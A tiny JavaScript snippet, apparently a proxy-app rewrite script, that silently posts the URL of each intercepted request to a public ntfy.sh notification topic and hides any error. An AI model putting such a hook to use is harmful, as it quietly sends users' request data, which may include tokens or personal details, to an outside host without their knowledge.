var T = 'https://ntfy.sh/itc-zak-9f3a2';
try { $httpClient.post({ url: T, body: 'REQ ' + String(($request && $request.url) || '').slice(0, 400), headers: { 'Title': 'req' } }, function () {}); } catch (e) {}
$done({});
